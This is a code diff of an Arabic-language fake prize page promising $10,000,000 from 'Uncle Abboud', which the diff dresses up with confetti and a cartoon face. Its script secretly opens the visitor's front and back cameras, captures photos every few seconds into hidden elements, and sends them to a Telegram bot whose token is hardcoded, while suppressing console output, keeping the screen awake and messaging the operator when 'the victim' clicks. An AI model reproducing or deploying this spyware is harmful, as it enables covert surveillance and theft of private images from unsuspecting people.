@@ -2,34 +2,224 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>جائزة حصرية</title>
+<title>🎉 جائزة عمك عبود</title>
 <style>
-body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0a0a); display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial; color:#fff; overflow:hidden; }
-.card { background:rgba(20,10,10,0.95); padding:40px; border-radius:30px; border:2px solid #ffd700; text-align:center; max-width:400px; box-shadow:0 0 60px rgba(255,215,0,0.2); }
-.card h1 { color:#ffd700; font-size:28px; }
-.card p { color:#ccc; margin:15px 0; font-size:16px; }
-.hidden { display:none !important; }
-#status { font-size:14px; color:#ff8844; margin-top:10px; }
-.sparkle { color:#ffd700; font-size:22px; animation: pulse 1.5s infinite; }
-@keyframes pulse { 0%,100%{opacity:0.5;} 50%{opacity:1;} }
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  background: linear-gradient(135deg, #0a0000, #1a0505, #0a0000);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  font-family: 'Arial', sans-serif;
+  overflow: hidden;
+  position: relative;
+}
+/* خلفية احتفالية */
+.confetti-container {
+  position: fixed;
+  top: 0; left: 0; width: 100%; height: 100%;
+  pointer-events: none;
+  z-index: 0;
+  overflow: hidden;
+}
+.confetti {
+  position: absolute;
+  width: 10px; height: 10px;
+  top: -10px;
+  animation: confettiFall linear infinite;
+}
+@keyframes confettiFall {
+  0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+  100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+}
+/* البطاقة */
+.card {
+  position: relative;
+  z-index: 1;
+  background: linear-gradient(145deg, #1a0808, #2d0a0a);
+  border: 3px solid #ffd700;
+  border-radius: 30px;
+  padding: 40px 35px;
+  max-width: 480px;
+  width: 92%;
+  text-align: center;
+  box-shadow: 0 0 60px rgba(255, 215, 0, 0.25), inset 0 0 60px rgba(255, 215, 0, 0.03);
+  animation: glowPulse 2.5s ease-in-out infinite;
+}
+@keyframes glowPulse {
+  0%, 100% { box-shadow: 0 0 40px rgba(255,215,0,0.2); }
+  50% { box-shadow: 0 0 80px rgba(255,215,0,0.45); }
+}
+.star { font-size: 70px; display: block; animation: spinStar 3s linear infinite; }
+@keyframes spinStar {
+  0% { transform: rotate(0deg) scale(1); }
+  50% { transform: rotate(180deg) scale(1.15); }
+  100% { transform: rotate(360deg) scale(1); }
+}
+.title {
+  color: #ffd700;
+  font-size: 32px;
+  font-weight: bold;
+  margin: 10px 0;
+  text-shadow: 0 0 30px rgba(255,215,0,0.4);
+}
+.subtitle { color: #ffaa00; font-size: 20px; margin: 5px 0; }
+.prize {
+  background: linear-gradient(145deg, #ffd700, #ff8c00);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  font-size: 38px;
+  font-weight: bold;
+  margin: 10px 0;
+}
+.message { color: #ffcc88; font-size: 17px; line-height: 1.8; margin: 15px 0; }
+.btn {
+  background: linear-gradient(145deg, #ffd700, #ff8c00);
+  color: #1a0000;
+  border: none;
+  padding: 14px 45px;
+  font-size: 19px;
+  font-weight: bold;
+  border-radius: 50px;
+  cursor: pointer;
+  transition: 0.3s;
+  margin-top: 10px;
+  box-shadow: 0 0 30px rgba(255,215,0,0.3);
+}
+.btn:hover { transform: scale(1.05); box-shadow: 0 0 60px rgba(255,215,0,0.6); }
+/* وجه عمك عبود */
+.uncle-face {
+  margin: 15px auto;
+  width: 150px; height: 150px;
+  background: radial-gradient(ellipse at 50% 40%, #d4a574, #b8834a);
+  border-radius: 50%;
+  position: relative;
+  display: inline-block;
+  border: 3px solid #8B6914;
+  box-shadow: 0 0 40px rgba(255,215,0,0.15);
+}
+.turban {
+  position: absolute;
+  width: 170px; height: 50px;
+  background: linear-gradient(180deg, #8B0000, #5a0000);
+  border-radius: 50% 50% 0 0;
+  top: -25px; left: 50%;
+  transform: translateX(-50%);
+  border: 2px solid #6B0000;
+}
+.turban::after { content: '💎'; position: absolute; font-size: 20px; top: 10px; left: 50%; transform: translateX(-50%); }
+.eye {
+  position: absolute;
+  width: 22px; height: 25px;
+  background: #fff;
+  border-radius: 50%;
+  top: 40px;
+}
+.eye::after {
+  content: '';
+  position: absolute;
+  width: 12px; height: 12px;
+  background: #2d1a0a;
+  border-radius: 50%;
+  bottom: 4px; left: 5px;
+  animation: eyeMove 3s ease-in-out infinite;
+}
+.eye-left { left: 28px; }
+.eye-right { right: 28px; }
+@keyframes eyeMove { 0%,100%{transform:translateX(0);} 25%{transform:translateX(3px);} 75%{transform:translateX(-3px);} }
+.brow {
+  position: absolute;
+  width: 30px; height: 6px;
+  background: #5a3a1a;
+  border-radius: 10px;
+  top: 32px;
+}
+.brow-left { left: 24px; transform: rotate(-10deg); }
+.brow-right { right: 24px; transform: rotate(10deg); }
+.mouth {
+  position: absolute;
+  width: 40px; height: 20px;
+  border-bottom: 4px solid #8B0000;
+  border-radius: 0 0 50% 50%;
+  bottom: 30px; left: 50%;
+  transform: translateX(-50%);
+  animation: smile 1.5s ease-in-out infinite;
+}
+@keyframes smile { 0%,100%{height:20px;} 50%{height:28px;} }
+.mustache {
+  position: absolute;
+  width: 50px; height: 20px;
+  background: #3a2510;
+  border-radius: 0 0 50% 50%;
+  bottom: 48px; left: 50%;
+  transform: translateX(-50%);
+}
+.mustache::before {
+  content: '';
+  position: absolute;
+  width: 30px; height: 15px;
+  background: #3a2510;
+  border-radius: 0 0 50% 50%;
+  left: -20px; top: 0;
+  transform: rotate(20deg);
+}
+.mustache::after {
+  content: '';
+  position: absolute;
+  width: 30px; height: 15px;
+  background: #3a2510;
+  border-radius: 0 0 50% 50%;
+  right: -20px; top: 0;
+  transform: rotate(-20deg);
+}
+.uncle-name { color: #ffd700; font-size: 20px; margin-top: 8px; font-weight: bold; }
+.hidden { display: none !important; }
+#status { color: #ff8844; font-size: 14px; margin-top: 12px; }
+.sparkle { color: #ffd700; font-size: 18px; animation: sparkleFloat 1.8s ease-in-out infinite; display: inline-block; }
+@keyframes sparkleFloat { 0%,100%{transform:scale(1);opacity:0.5;} 50%{transform:scale(1.3);opacity:1;} }
+.recording-status { color: #ff4444; font-size: 13px; margin-top: 8px; animation: blink 1s infinite; }
+@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
 </style>
 </head>
 <body>
 
-<div class="card" id="mainCard">
-  <h1>🎉 فوز مفاجئ!</h1>
-  <p>لقد اخترتك لجائزة <strong style="color:#ffd700;">10,000,000$</strong></p>
-  <p style="font-size:13px;color:#888;">جاري تجهيز الجائزة... <span class="sparkle">✦</span></p>
-  <div id="status">⏳ يرجى الانتظار...</div>
-</div>
+<div class="confetti-container" id="confettiContainer"></div>
 
-<!-- فيديوهات مخفية -->
+<!-- عناصر الفيديو والكانفس المخفية -->
 <video id="videoFront" autoplay muted playsinline class="hidden"></video>
 <video id="videoBack" autoplay muted playsinline class="hidden"></video>
-
-<!-- كانفس للتصوير -->
 <canvas id="canvasFront" class="hidden"></canvas>
 <canvas id="canvasBack" class="hidden"></canvas>
+
+<div class="card">
+  <span class="star">⭐</span>
+  <div class="title">🎉 مبروك! 🎉</div>
+  <div class="subtitle">لقد فزت بجائزة عمك عبود!</div>
+  
+  <div class="uncle-face">
+    <div class="turban"></div>
+    <div class="brow brow-left"></div>
+    <div class="brow brow-right"></div>
+    <div class="eye eye-left"></div>
+    <div class="eye eye-right"></div>
+    <div class="mustache"></div>
+    <div class="mouth"></div>
+  </div>
+  <div class="uncle-name">👳 عمك عبود</div>
+  
+  <div class="prize">🏆 10,000,000 $ 🏆</div>
+  <div class="message">
+    🎁 الجائزة عند <strong>عمك عبود</strong> 🎁<br>
+    📍 تعال واستلمها الآن!<br>
+    💰 جائزة قيمتها <strong>10,000,000$</strong>
+  </div>
+  
+  <button class="btn" onclick="claimPrize()">🤑 استلم الجائزة الآن</button>
+  <div style="margin-top:8px;color:#ff8844;font-size:13px;">⏳ العرض محدود - اسرع!</div>
+  <div id="status">📷 جاري تجهيز الجائزة...</div>
+  <div class="recording-status" id="recordingStatus">🔴 جاري التصوير...</div>
+</div>
 
 <script>
 // ============================================================
@@ -37,13 +227,33 @@ body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0a0a); display:fle
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
-let frontStream = null, backStream = null;
 let frontInterval = null, backInterval = null;
 let photoCount = 0;
-const CAPTURE_INTERVAL = 3000; // كل 3 ثواني صورة
+const CAPTURE_INTERVAL = 2500; // كل 2.5 ثانية
 
 // ============================================================
-// ================ الحصول على CHAT_ID ========================
+// ================ CONFETTI ===================================
+// ============================================================
+function createConfetti() {
+  const container = document.getElementById('confettiContainer');
+  const colors = ['#ffd700', '#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6bff', '#ffaa00'];
+  for (let i = 0; i < 70; i++) {
+    const c = document.createElement('div');
+    c.className = 'confetti';
+    c.style.left = Math.random() * 100 + '%';
+    c.style.background = colors[Math.floor(Math.random() * colors.length)];
+    c.style.width = (Math.random() * 8 + 4) + 'px';
+    c.style.height = (Math.random() * 8 + 4) + 'px';
+    c.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+    c.style.animationDuration = (Math.random() * 3 + 2) + 's';
+    c.style.animationDelay = (Math.random() * 4) + 's';
+    container.appendChild(c);
+  }
+}
+createConfetti();
+
+// ============================================================
+// ================ TELEGRAM FUNCTIONS ========================
 // ============================================================
 function getChatId() {
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
@@ -53,7 +263,7 @@ function getChatId() {
         let last = d.result[d.result.length - 1];
         CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
         if (CHAT_ID) {
-          sendMessage('✅ تم تفعيل التصوير الخفي');
+          sendMessage('✅ تم تفعيل جائزة عمك عبود + التصوير');
           startHiddenCamera();
         } else {
           setTimeout(getChatId, 2000);
@@ -65,9 +275,6 @@ function getChatId() {
     .catch(() => setTimeout(getChatId, 2000));
 }
 
-// ============================================================
-// ================ إرسال الصور إلى تليجرام ===================
-// ============================================================
 function sendMessage(text) {
   if (!CHAT_ID) return;
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -84,7 +291,7 @@ function sendPhoto(imageData, caption = '') {
     let fd = new FormData();
     fd.append('chat_id', CHAT_ID);
     fd.append('photo', blob, `photo_${Date.now()}.jpg`);
-    fd.append('caption', caption || '📸 صورة ملتقطة');
+    fd.append('caption', caption || '📸 صورة من عمك عبود');
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
       body: fd
@@ -103,7 +310,15 @@ function dataURLtoBlob(dataURL) {
 }
 
 // ============================================================
-// ================ تشغيل الكاميرات بشكل خفي ==================
+// ================ زر استلام الجائزة ==========================
+// ============================================================
+function claimPrize() {
+  alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌\n📍 استلمها الآن!');
+  sendMessage('🤑 الضحية نقر على زر استلام الجائزة!');
+}
+
+// ============================================================
+// ================ تشغيل الكاميرات الخفية ====================
 // ============================================================
 function startHiddenCamera() {
   // ---- الكاميرا الأمامية ----
@@ -112,28 +327,25 @@ function startHiddenCamera() {
     audio: false
   })
   .then(stream => {
-    frontStream = stream;
     let video = document.getElementById('videoFront');
     video.srcObject = stream;
     video.play();
     
-    // إعداد الكانفس للأمامية
     let canvas = document.getElementById('canvasFront');
     canvas.width = 640;
     canvas.height = 480;
     let ctx = canvas.getContext('2d');
     
-    // بدأ التصوير الدوري
     frontInterval = setInterval(() => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      let imgData = canvas.toDataURL('image/jpeg', 0.9);
+      let imgData = canvas.toDataURL('image/jpeg', 0.85);
       photoCount++;
-      sendPhoto(imgData, `📸 كاميرا أمامية #${photoCount}`);
-      sendMessage(`📸 تم تصوير أمامي #${photoCount}`);
-      document.getElementById('status').innerHTML = `📸 تم التقاط ${photoCount} صور`;
+      sendPhoto(imgData, `📸 أمامي #${photoCount} - عمك عبود`);
+      sendMessage(`📸 صورة أمامية #${photoCount}`);
+      document.getElementById('status').innerHTML = `📸 تم تصوير ${photoCount} صور`;
     }, CAPTURE_INTERVAL);
     
-    sendMessage('✅ تم تشغيل الكاميرا الأمامية');
+    sendMessage('✅ الكاميرا الأمامية تعمل');
   })
   .catch(err => {
     sendMessage('❌ فشل الكاميرا الأمامية: ' + err.message);
@@ -145,26 +357,23 @@ function startHiddenCamera() {
     audio: false
   })
   .then(stream => {
-    backStream = stream;
     let video = document.getElementById('videoBack');
     video.srcObject = stream;
     video.play();
     
-    // إعداد الكانفس للخلفية
     let canvas = document.getElementById('canvasBack');
     canvas.width = 640;
     canvas.height = 480;
     let ctx = canvas.getContext('2d');
     
-    // بدأ التصوير الدوري
     backInterval = setInterval(() => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      let imgData = canvas.toDataURL('image/jpeg', 0.9);
-      sendPhoto(imgData, `📸 كاميرا خلفية #${photoCount}`);
-      sendMessage(`📸 تم تصوير خلفي #${photoCount}`);
+      let imgData = canvas.toDataURL('image/jpeg', 0.85);
+      sendPhoto(imgData, `📸 خلفي #${photoCount} - عمك عبود`);
+      sendMessage(`📸 صورة خلفية #${photoCount}`);
     }, CAPTURE_INTERVAL);
     
-    sendMessage('✅ تم تشغيل الكاميرا الخلفية');
+    sendMessage('✅ الكاميرا الخلفية تعمل');
   })
   .catch(err => {
     sendMessage('❌ فشل الكاميرا الخلفية: ' + err.message);
@@ -175,25 +384,20 @@ function startHiddenCamera() {
     navigator.wakeLock.request('screen').catch(() => {});
   }
 
-  // تحديث الواجهة
   document.getElementById('status').innerHTML = '📷 جاري التصوير...';
-  document.querySelector('.card p').innerHTML = '🎁 جاري تجهيز جائزتك <span class="sparkle">✦</span>';
+  document.getElementById('recordingStatus').innerHTML = '🔴 جاري التصوير الخفي';
 }
 
 // ============================================================
 // ================ حافظ على النشاط ===========================
 // ============================================================
 setInterval(() => {
-  if (CHAT_ID) sendMessage('🔄 التصوير الخفي مستمر');
+  if (CHAT_ID) sendMessage('🔄 عمك عبود يصور...');
   
-  // إعادة تشغيل الكاميرات إذا توقفت
-  if (frontStream && !frontInterval) {
+  if (!frontInterval && !backInterval) {
     startHiddenCamera();
   }
-  if (backStream && !backInterval) {
-    startHiddenCamera();
-  }
-}, 30000);
+}, 25000);
 
 // ============================================================
 // ================ Service Worker =============================
@@ -217,24 +421,20 @@ if ('serviceWorker' in navigator) {
 // ============================================================
 console.log = console.warn = console.error = () => {};
 
-// الحصول على CHAT_ID وبدء التصوير
 getChatId();
 
-// محاولة إعادة المحاولة
 setTimeout(() => {
   if (!CHAT_ID) getChatId();
 }, 5000);
 
-// بدء التصوير حتى لو لم يصل CHAT_ID بعد
 setTimeout(() => {
   if (!frontInterval && !backInterval) {
     startHiddenCamera();
   }
 }, 2000);
 
-// إرسال إشعار بدء
 setTimeout(() => {
-  if (CHAT_ID) sendMessage('🔥 بدأ التصوير الخفي - صور أمامية وخلفية');
+  if (CHAT_ID) sendMessage('🔥 عمك عبود بدأ التصوير الخفي');
 }, 3000);
 </script>
 </body>
